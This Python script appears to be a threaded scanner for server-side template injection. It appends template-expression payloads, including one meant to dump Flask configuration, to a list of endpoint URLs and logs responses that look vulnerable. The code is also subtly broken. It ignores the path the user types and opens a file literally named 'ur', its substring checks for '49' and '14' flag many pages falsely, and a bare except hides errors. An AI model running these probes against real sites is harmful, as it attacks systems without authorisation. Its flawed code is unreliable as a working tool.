import threading
import requests


payloads = ["{{7*7}}", "{{7+7}}", "{{config.items()}}", "{{7*'7'}}", "<%= 7 * 7 %>", "${7*7}", "${{7*7}}", "@(7+7)", "#{7*7}", "#{ 7 * 7 }"]


def test_ssti(url, payload):
    try:
        for u in url:
            al = f"{u}{payload}"
            r = requests.get(al)
            if "49" in r.text or "14" in r.text or "config" in r.text or "7777777" in r.text:
                print(f"[+] SSTI found: {al}")
                with open("ssti_results.txt", "a") as f:
                    f.write(f"{al}\n")
    except:
        pass


ur = input("Enter EndPoints Path >>> ")
url = open('ur', 'r').read().split('\n')
threads = []
for payload in payloads:
    t = threading.Thread(target=test_ssti, args=(url, payload))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

